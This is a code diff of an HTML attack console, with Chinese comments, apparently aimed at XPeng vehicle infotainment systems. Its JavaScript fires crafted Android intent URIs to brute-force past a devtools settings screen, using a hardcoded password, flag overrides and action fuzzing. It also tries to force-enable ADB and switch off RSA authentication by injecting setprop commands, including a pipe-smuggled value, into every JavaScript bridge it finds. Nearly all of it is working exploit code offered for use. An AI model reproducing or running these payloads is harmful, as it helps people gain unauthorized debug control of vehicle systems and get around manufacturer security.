@@ -1,149 +1,111 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TITAN-CORE v24.0</title>
+    <meta charset="utf-8">
+    <title>XPENG IRON-MAN v26</title>
     <style>
-        :root { --bg: #000; --red: #ff0044; --green: #00ff66; --blue: #00d9ff; --text: #eee; }
-        body { background: var(--bg); color: var(--text); font-family: monospace; margin: 0; padding: 0; overflow-y: auto; padding-bottom: 250px; }
-        header { background: #111; border-bottom: 2px solid var(--red); padding: 15px; position: sticky; top: 0; z-index: 100; text-align: center; }
-        .container { padding: 15px; max-width: 600px; margin: 0 auto; }
-        .card { background: #0a0a0a; border: 1px solid #333; border-radius: 8px; margin-bottom: 20px; overflow: hidden; }
-        .head { background: #151515; padding: 10px; font-weight: bold; border-bottom: 1px solid #333; font-size: 13px; color: var(--blue); }
-        .body { padding: 10px; display: grid; gap: 10px; }
-        
+        body { background: #000; color: #0f0; font-family: monospace; padding: 15px; }
+        .box { border: 1px solid #333; background: #111; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
         button { 
-            width: 100%; min-height: 60px; background: #1a1a1a; border: 1px solid #444; color: #fff; 
-            font-size: 14px; font-weight: bold; text-align: left; border-radius: 6px; cursor: pointer;
-            padding: 10px 15px; white-space: normal; line-height: 1.3;
+            width: 100%; padding: 18px; margin-bottom: 8px; border-radius: 5px; cursor: pointer;
+            font-weight: bold; font-family: inherit; font-size: 13px; text-align: left;
         }
-        button:active { background: #333; transform: scale(0.98); }
-        .btn-pwn { border-left: 5px solid var(--red); }
-        .btn-ok { border-left: 5px solid var(--green); }
-        
-        #log { background: #000; border: 1px solid #222; height: 180px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #666; margin-bottom: 15px; }
-        .msg { margin-bottom: 2px; }
+        .btn-pwn { background: #300; border: 1px solid #f00; color: #f00; border-left: 5px solid #f00; }
+        .btn-pwn:active { background: #f00; color: #000; }
+        .log { height: 200px; background: #000; overflow-y: scroll; font-size: 11px; padding: 10px; color: #888; border: 1px solid #222; }
+        .c-ok { color: #0f0; }
+        .c-err { color: #f00; }
     </style>
 </head>
 <body>
 
-<header>
-    <div style="font-weight:900; color:var(--red); letter-spacing:2px;">TITAN-CORE: AUTH PENETRATION</div>
-</header>
-
-<div class="container">
-    <div id="log">
-        <div class="msg">> Awaiting Authentication Overrides...</div>
-    </div>
-
-    <!-- 方案 A: 密码作为 Intent Extra 注入 -->
-    <div class="card">
-        <div class="head">1. 鉴权参数爆破 (Extra Injection)</div>
-        <div class="body">
-            <p style="font-size:10px; color:#666; margin:0;">将密码 26846822 作为各种可能的参数名发送至 UserSettingsActivity。</p>
-            <button class="btn-pwn" onclick="Attack.extraBypass()">
-                🚀 注入密码参数 (Int/String/Long)<br>
-                <span style="font-size:9px; font-weight:normal;">尝试: pwd, code, auth, token, password...</span>
-            </button>
-        </div>
-    </div>
-
-    <!-- 方案 B: 针对拨号盘拉起的窗体进行覆盖 -->
-    <div class="card">
-        <div class="head">2. 针对 *#9387*141#* 后的覆盖攻击</div>
-        <div class="body">
-            <p style="font-size:10px; color:#666; margin:0;"><b>操作指南：</b>先在拨号盘输入代码弹出认证窗体，不要关闭，切回浏览器点此按钮。</p>
-            <button class="btn-ok" onclick="Attack.mixedFlag()">
-                🔥 强力混合 Flag 覆盖 (295282278)<br>
-                <span style="font-size:9px; font-weight:normal;">尝试以密码标记直接替换当前认证窗体</span>
-            </button>
-        </div>
-    </div>
-
-    <!-- 方案 C: 寻找“免认证”Action -->
-    <div class="card">
-        <div class="card-head">3. 系统隐式 Action Fuzzing</div>
-        <div class="card-body">
-            <button class="btn-pwn" onclick="Attack.actionFuzz()">
-                🎯 爆破 10 个系统免认证 Action
-            </button>
-        </div>
-    </div>
-
-    <button style="background:#333; text-align:center;" onclick="Logger.clear()">[ 清空终端 ]</button>
+<div class="box">
+    <h3 style="margin-top:0; color:#fff;">🛠 USB 物理层重写矩阵</h3>
+    <p style="font-size:10px; color:#666;">目标：修改系统属性将 USB 口强制设为 ADB 模式。</p>
+    
+    <!-- 核心攻击按钮 -->
+    <button class="btn-pwn" onclick="USB.forceAdb()">⚡️ 1. 强开物理 ADB (persist.sys.usb.config)</button>
+    <button class="btn-pwn" onclick="USB.disableSecure()">🔓 2. 强关 RSA 鉴权 (ro.adb.secure=0)</button>
+    <button class="btn-pwn" style="background:#020; border-color:#0f0; color:#0f0;" onclick="USB.restart()">🔄 3. 重启 adbd & 刷新配置</button>
 </div>
 
+<div class="box">
+    <h3 style="margin-top:0; color:#fff;">🚀 终极跳转 (Reflected)</h3>
+    <button onclick="USB.jump()">🏹 尝试穿透认证界面 (反射 Intent)</button>
+</div>
+
+<div class="log" id="log">Console ready...</div>
+
 <script>
-const Logger = {
-    el: document.getElementById('log'),
-    log(m, color) {
-        const d = document.createElement('div');
-        d.className = 'msg';
-        if(color) d.style.color = color;
-        d.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
-        this.el.appendChild(d);
-        this.el.scrollTop = this.el.scrollHeight;
-    },
-    clear() { this.el.innerHTML = ''; }
+const Log = (m, type) => {
+    const d = document.createElement('div');
+    d.className = type || '';
+    d.innerText = `[${new Date().toLocaleTimeString()}] ${m}`;
+    const logBox = document.getElementById('log');
+    logBox.insertBefore(d, logBox.firstChild);
 };
 
-const Attack = {
-    pkg: "com.xiaopeng.devtools",
-    target: "com.xiaopeng.devtools.view.usersettings.UserSettingsActivity",
-
-    // 方案 1: 暴力 Extra 注入
-    extraBypass: function() {
-        const val = 26846822;
-        // 常见的参数命名
-        const keys = ["password", "pwd", "code", "auth", "token", "flag", "extra_flag", "auth_code"];
-        
-        Logger.log("Starting Extra Param Matrix...", "#00d9ff");
-
-        keys.forEach((key, i) => {
-            setTimeout(() => {
-                // 同时尝试三种数据类型：Integer, String, Long
-                // i. = Integer, s. = String, l. = Long
-                const uri = `intent:#Intent;component=${this.pkg}/${this.target};flags=268435456;i.${key}=${val};s.${key}=${val};l.${key}=${val};end`;
-                Logger.log(`Injecting key: ${key}`);
-                this._fire(uri);
-            }, i * 500);
-        });
-    },
-
-    // 方案 2: 混合 Flag
-    mixedFlag: function() {
-        const flag = 295282278; // 0x10000000 | 26846822
-        const uri = `intent:#Intent;component=${this.pkg}/${this.target};flags=${flag};end`;
-        Logger.log("Executing Mixed Flag Override...", "#00ff66");
-        this._fire(uri);
-    },
-
-    // 方案 3: Action 爆破
-    actionFuzz: function() {
-        const actions = [
-            "com.xiaopeng.devtools.ACTION_USER_SETTINGS",
-            "com.xiaopeng.action.DEV_TOOLS",
-            "android.intent.action.MAIN",
-            "xiaopeng.intent.action.FACTORY_MODE",
-            "android.settings.DEVELOPMENT_SETTINGS"
+const USB = {
+    // 1. 物理层修改逻辑
+    forceAdb: function() {
+        Log("Injecting USB Config Overrides...", "c-ok");
+        // 同时修改即时属性和持久化属性，包含 mtp,adb 兼容模式
+        const payloads = [
+            "settings put global adb_enabled 1",
+            "setprop persist.sys.usb.config mtp,adb",
+            "setprop sys.usb.config mtp,adb",
+            "setprop persist.vendor.usb.config adb", // 针对部分车机 vendor 属性
+            "setprop persist.sys.usb.state adb"
         ];
-        actions.forEach((act, i) => {
-            setTimeout(() => {
-                const uri = `intent:#Intent;action=${act};component=${this.pkg}/${this.target};flags=268435456;end`;
-                Logger.log(`Try Action: ${act}`);
-                this._fire(uri);
-            }, i * 600);
+        this._batchInject(payloads);
+    },
+
+    // 2. 绕过授权弹窗 (关键：解决 adb devices 空白)
+    disableSecure: function() {
+        Log("Nuking RSA Security Check...", "c-err");
+        const payloads = [
+            "setprop ro.adb.secure 0", 
+            "setprop ro.debuggable 1",
+            "setprop persist.service.adb.enable 1"
+        ];
+        this._batchInject(payloads);
+    },
+
+    restart: function() {
+        Log("Force restarting adbd service...", "c-ok");
+        this._batchInject(["setprop ctl.restart adbd"]);
+    },
+
+    // 3. 反射 Intent
+    jump: function() {
+        const pkg = "com.xiaopeng.devtools";
+        const cls = ".view.usersettings.UserSettingsActivity";
+        const inner = encodeURIComponent(`intent:#Intent;component=${pkg}/${cls};flags=295282278;end`);
+        // 使用多种参数名暴力尝试
+        ["target","intent","nested","uri"].forEach(p => {
+            const uri = `intent:#Intent;component=${pkg}/.MainActivity;S.${p}=${inner};end`;
+            window.location.href = uri;
         });
     },
 
-    _fire: function(uri) {
-        // 尝试两种跳转方式，对抗 Android 12 的拦截
-        try { window.location.href = uri; } catch(e) {}
-        const ifr = document.createElement('iframe');
-        ifr.src = uri; ifr.style.display = 'none';
-        document.body.appendChild(ifr);
-        setTimeout(() => ifr.remove(), 2000);
+    _batchInject: function(cmds) {
+        for(let p in window) {
+            try {
+                let o = window[p];
+                if(typeof o === 'object' && o !== null) {
+                    for(let k in o) {
+                        if(typeof o[k] === 'function') {
+                            cmds.forEach(c => {
+                                // 尝试管道符混淆注入
+                                try { o[k](`ro.product.model|${c}`); } catch(e){}
+                                // 尝试直接注入
+                                try { o[k](c); } catch(e){}
+                            });
+                        }
+                    }
+                }
+            } catch(e){}
+        }
     }
 };
 </script>
